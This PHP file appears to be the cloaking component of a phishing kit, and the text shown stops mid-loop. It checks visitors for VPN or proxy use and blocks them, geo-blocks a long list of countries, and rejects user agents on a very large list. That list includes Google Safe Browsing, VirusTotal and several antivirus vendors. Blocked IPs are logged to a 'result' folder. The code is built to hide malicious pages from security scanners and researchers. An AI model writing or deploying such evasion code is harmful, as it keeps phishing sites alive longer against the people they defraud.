<?php 
ini_set( "display_errors", 0); 

$tanitatikaram = parse_ini_file("config.ini", true);
$setting_proxy = $tanitatikaram['setting_proxy'];
$setting_country = $tanitatikaram['setting_country'];
if ($setting_proxy == 'on') {
    $ip = getenv("REMOTE_ADDR");
    if ($ip == "127.0.0.1") {
    } else {
        $url = "https://blackbox.ipinfo.app/lookup/" . $ip;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        $result = $resp;
        if ($result == "Y") {
            $file = fopen("proxy-block.txt", "a");
            $message = $ip . "
";
            fwrite($file, $message);
            fclose($file);
            $click = fopen("result/total_bot.txt", "a");
            fwrite($click, "$ip|blackbox VPN/Proxy" . "
");
            fclose($click);
            header("HTTP/1.0 404 Not Found");
            die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access by MAC / on this server.</p></body></html>');
            exit();
        }
    }
}
if ($setting_country == 'on') {
    $ip = getenv("REMOTE_ADDR");
    $url = "http://www.geoplugin.net/json.gp?ip=" . $ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);
    $countrycode = $details['geoplugin_countryCode'];
    if ($countrycode == "NL") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "A1") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AD") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AF") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AL") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AP") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AQ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AW") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AX") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "AZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BB") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BD") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BD") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BF") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BJ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BV") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BV") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BW") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "BZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CC") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CD") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CF") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CL") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CV") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CX") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "CZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "DE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "DJ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "DK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "DM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "DO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "DZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "EC") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "EE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "EG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "EH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ER") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ES") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ET") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "EU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "FI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "FJ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "FK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "FM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "FO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "FR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GB") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GD") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GF") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GL") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GP") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GQ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GW") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "GY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "HK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "HM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "HN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "HR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "HT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "HU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ID") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IL") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IQ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "IT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "JE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "JM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "JO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "JP") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KP") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KW") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "KZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LB") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LC") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LV") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "LY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MC") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MD") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ME") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ML") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MP") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MQ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MQ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MV") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MW") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MX") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "MZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NC") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NF") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NP") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "NZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "OM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PF") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PL") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PW") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "PY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "QA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "RE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "RO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "RS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "RU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "RW") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SB") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SC") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SD") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SJ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SL") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ST") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SV") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "SZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TC") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TD") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TF") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TH") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TJ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TK") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TL") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TO") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TR") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TV") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TW") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "TZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "UA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "UG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "UM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "UY") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "UZ") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "VA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "VC") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "VE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "VG") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "VI") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "VN") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "VU") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "WF") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "WS") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "YE") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "YT") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ZA") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ZM") {
        header("HTTP/1.0 404 Not Found");
    } else if ($countrycode == "ZW") {
        header("HTTP/1.0 404 Not Found");
    }
}
$Bot = array('Googlebot', 'bot', 'Bot', 'Amazonaws', 'Google', 'safebrowsing', 'googlesafebrowing', 'Fortiguard', 'Baiduspider', 'ia_archiver', 'NetcraftSurveyAgent', 'Sogouwebspider', 'bingbot', 'Yahoo!Slurp', 'facebookexternalhit', 'PrintfulBot', 'msnbot', 'Twitterbot', 'UnwindFetchor', 'urlresolver', 'Butterfly', 'TweetmemeBot', 'PaperLiBot', 'MJ12bot', 'AhrefsBot', 'MicrosoftCorporation', 'Exabot', 'Ezooms', 'YandexBot', 'SearchmetricsBot', 'picsearch', 'TweetedTimesBot', 'QuerySeekerSpider', 'ShowyouBot', 'woriobot', 'merlinkbot', 'BazQuxBot', 'Kraken', 'SISTRIXCrawler', 'R6_CommentReader', 'magpie-crawler', 'GrapeshotCrawler', 'PercolateCrawler', 'MaxPointCrawler', 'R6_FeedFetcher', 'NetSeercrawler', 'grokkit-crawler', 'SMXCrawler', 'PulseCrawler', 'Y!J-BRW', '80legs.com/webcrawler', 'Mediapartners-Google', 'Spinn3r', 'InAGist', 'Python-urllib', 'NING', 'TencentTraveler', 'Feedfetcher-Google', 'mon.itor.us', 'spbot', 'Feedly', 'bitlybot', 'ADmantXPlatform', 'Niki-Bot', 'Pinterest', 'python-requests', 'DotBot', 'HTTP_Request2', 'linkdexbot', 'A6-Indexer', 'Baiduspider', 'TwitterFeed', 'MicrosoftOffice', 'Pingdom', 'BTWebClient', 'KatBot', 'SiteCheck', 'proximic', 'Sleuth', 'Abonti', '(BOTforJCE)', 'Baidu', 'TinyTinyRSS', 'newsblur', 'updown_tester', 'linkdex', 'baidu', 'searchmetrics', 'genieo', 'majestic12', 'spinn3r', 'profound', 'domainappender', 'VegeBot', 'terrykyleseoagency.com', 'CommonCrawlerNode', 'metauri.com', 'libwww-perl', 'rogerbot-crawler', 'MegaIndex.ru', 'Qwantify', 'Traackr.com', 'Re-AnimatorBot', 'Pcore-HTTP', 'BoardReader', 'omgili', 'okhttp', 'CCBot', 'Java/1.8', 'semrush.com', 'feedbot', 'CommonCrawler', 'AdlesseBot', 'MetaURI', 'ibwww-perl', 'rogerbot', 'MegaIndex', 'BLEXBot', 'FlipboardProxy', 'techinfo@ubermetrics-technologies.com', 'trendictionbot', 'Mediatoolkitbot', 'trendiction', 'ubermetrics', 'ScooperBot', 'TrendsmapResolver', 'Nuzzel', 'Go-http-client', 'Applebot', 'LivelapBot', 'GroupHigh', 'SemrushBot', 'ltx71', 'commoncrawl', 'istellabot', 'DomainCrawler', 'cs.daum.net', 'StormCrawler', 'GarlikCrawler', 'TheKnowledgeAI', 'getstream.io/winds', 'YisouSpider', 'archive.org_bot', 'FemtosearchBot', '360Spider', 'linkfluence.com', 'glutenfreepleasure.com', 'GlutenFreeCrawler', 'YaK/1.0', 'Cliqzbot', 'app.hypefactors.com', 'axios', 'semantic-visions.com', 'webdatastats.com', 'schmorp.de', 'SEOkicks', 'DuckDuckBot', 'ZoominfoBot', 'Mail.RU_Bot', 'OnalyticaBot', 'LingueeBot', 'admantx-adform', 'Buck/2.2', 'Barkrowler', 'Zombiebot', 'Nutch', 'SemanticScholarBot', 'Jetslide', 'scalaj-http', 'XoviBot', 'sysomos.com', 'PocketParser', 'newspaper', 'serpstatbot', 'MetaJobBot', 'SeznamBot/3.2', 'VelenPublicWebCrawler/1.0', 'WordPress.commShots', 'adscanner', 'BacklinkCrawler', 'netEstateNECrawler', 'AstuteSRM', 'GigablastOpenSource/1.0', 'DomainStatsBot', 'Winds:OpenSourceRSS&Podcast', 'dlvr.it', 'BehloolBot', '7Siters', 'AwarioSmartBot', 'Apache-HttpClient/5', 'SeekportCrawler', 'AHC/2.1', 'eCairn-Grabber', 'mediawordsbot', 'PHP-Curl-Class', 'Scrapy', 'curl/7', 'Blackboard', 'NetNewsWire', 'node-fetch', 'admantx', 'metadataparser', 'DomainsProject', 'SerendeputyBot', 'Moreover', 'DuckDuckGo', "abot", "dbot", "ebot", "hbot", "kbot", "lbot", "mbot", "nbot", "obot", "pbot", "rbot", "sbot", "tbot", "vbot", "ybot", "zbot", "bot.", "bot/", "_bot", ".bot", "/bot", "-bot", ":bot", "(bot", "crawl", "slurp", "spider", "seek", "avg", "avira", "bitdefender", "kaspersky", "sophos", "accoona", "adressendeutschland", "ah-ha.com", "ahoy", "altavista", "ananzi", "anthill", "appie", "arachnophilia", "arale", "araneo", "aranha", "architext", "aretha", "arks", "asterias", "atlocal", "atn", "atomz", "augurfind", "backrub", "bannana_bot", "baypup", "bdfetch", "big brother", "biglotron", "bjaaland", "blaiz", "blog", "blo.", "bloodhound", "boitho", "booch", "bradley", "butterfly", "calif", "cassandra", "ccubee", "cfetch", "charlotte", "churl", "cienciaficcion", "cmc", "collective", "comagent", "combine", "computingsite", "csci", "cusco", "daumoa", "deepindex", "delorie", "depspid", "deweb", "die blinde kuh", "digger", "ditto", "dmoz", "docomo", "download express", "dtaagent", "dwcp", "ebiness", "ebingbong", "e-collector", "ejupiter", "emacs-w3 search engine", "esther", "evliya celebi", "ezresult", "falcon", "felix ide", "ferret", "fetchrover", "fido", "findlinks", "fireball", "fish search", "fouineur", "funnelweb", "gazz", "gcreep", "genieknows", "getterroboplus", "geturl", "glx", "goforit", "golem", "grabber", "grapnel", "gralon", "griffon", "gromit", "grub", "gulliver", "hamahakki", "harvest", "havindex", "helix", "heritrix", "hku www octopus", "homerweb", "htdig", "html index", "html_analyzer", "htmlgobble", "hubater", "hyper-decontextualizer", "ibm_planetwide", "ichiro", "iconsurf", "iltrovatore", "image.kapsi.net", "imagelock", "incywincy", "indexer", "infobee", "informant", "ingrid", "inktomisearch.com", "inspector web", "intelliagent", "internet shinchakubin", "ip3000", "iron33", "israeli-search", "ivia", "jack", "jakarta", "javabee", "jetbot", "jumpstation", "katipo", "kdd-explorer", "kilroy", "knowledge", "kototoi", "kretrieve", "labelgrabber", "lachesis", "larbin", "legs", "libwww", "linkalarm", "link validator", "linkscan", "lockon", "lwp", "lycos", "magpie", "mantraagent", "mapoftheinternet", "marvin/", "mediafox", "mediapartners", "mercator", "merzscope", "microsoft url control", "minirank", "miva", "mnogosearch", "moget", "monster", "moose", "motor", "multitext", "muncher", "muscatferret", "mwd.search", "myweb", "najdi", "nameprotect", "nationaldirectory", "nazilla", "ncsa beta", "nec-meshexplorer", "nederland.zoek", "netcarta webmap engine", "netmechanic", "netresearchserver", "NetcraftSurveyAgent", "netscoop", "newscan-online", "nhse", "nokia6682/", "nomad", "noyona", "siteexplorer", "nzexplorer", "objectssearch", "occam", "omni", "open text", "openfind", "openintelligencedata", "orb search", "osis-project", "pack rat", "pageboy", "pagebull", "page_verifier", "panscient", "parasite", "partnersite", "patric", "pear.", "pegasus", "peregrinator", "pgp key agent", "phantom", "phpdig", "picosearch", "piltdownman", "pimptrain", "pinpoint", "pioneer", "piranha", "plumtreewebaccessor", "pogodak", "poirot", "pompos", "poppelsdorf", "poppi", "popular iconoclast", "psycheclone", "publisher", "rambler", "raven search", "roach", "road runner", "roadhouse", "robbie", "robofox", "robozilla", "rules", "salty", "sbider", "scooter", "scoutjet", "scrubby", "search.", "searchprocess", "semanticdiscovery", "senrigan", "sg-scout", "shai'hulud", "shark", "shopwiki", "sidewinder", "sift", "silk", "simmany", "site searcher", "site valet", "sitetech-rover", "skymob.com", "sleek", "smartwit", "sna-", "snappy", "snooper", "sohu", "speedfind", "sphere", "sphider", "spinner", "spyder", "steeler/", "suke", "suntek", "supersnooper", "surfnomore", "sven", "szukacz", "tach black widow", "tarantula", "templeton", "/teoma", "t-h-u-n-d-e-r-s-t-o-n-e", "theophrastus", "titan", "titin", "tkwww", "toutatis", "t-rex", "tutorgig", "twiceler", "twisted", "ucsd", "udmsearch", "url check", "updated", "vagabondo", "valkyrie", "verticrawl", "victoria", "vision-search", "volcano", "voyager/", "voyager-hc", "w3c_validator", "w3m2", "w3mir", "walker", "wallpaper", "wanderer", "wauuu", "wavefire", "web core", "web hopper", "web wombat", "webbandit", "webcatcher", "webcopy", "webfoot", "weblayers", "weblinker", "weblog monitor", "webmirror", "webmonkey", "webquest", "webreaper", "websitepulse", "websnarf", "webstolperer", "webvac", "webwalk", "webwatch", "webwombat", "webzinger", "whizbang", "whowhere", "wild ferret", "worldlight", "wwwc", "wwwster", "xenu", "xget", "xift", "xirq", "yandex", "yanga", "yeti", "yodao", "zao/", "zippp", "zyborg", "proximic", "Googlebot", "Google", "Baiduspider", "Cliqzbot", "A6-Indexer", "AhrefsBot", "Genieo", "BomboraBot", "CCBot", "URLAppendBot", "DomainAppender", "msnbot-media", "Antivirus", "YoudaoBot", "MJ12bot", "linkdexbot", "Go-http-client", "BingPreview", "go-http-client", "go-http-client/1.1", "trident", "presto", "virustotal", "unchaos", "dreampassport", "sygol", "nutch", "privoxy", "zipcommander", "neofonie", "abacho", "acoi", "acoon", "adaxas", "agada", "aladin", "alkaline", "amibot", "anonymizer", "aplix", "aspseek", "avant", "baboom", "anzwers", "anzwerscrawl", "crawlconvera", "del.icio.us", "camehttps", "annotate", "wapproxy", "translate", "feedfetcher", "ask24", "asked", "askaboutoil", "fangcrawl", "amzn_assoc", "bingpreview", "dr.web", "drweb", "bilbo", "blackwidow", "sogou", "sogou-test-spider", "exabot", "externalhit", "ia_archiver", "mj12", "okhttp", "simplepie", "curl", "wget", "virus", "pipes", "antivirus", "python", "ruby", "avast", "firebird", "scmguard", "adsbot", "weblight", "favicon", "analytics", "insights", "headless", "github", "node", "agusescan", "zteopen");
foreach ($Bot as $BotType) {
    if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
        $ip = getenv("REMOTE_ADDR");
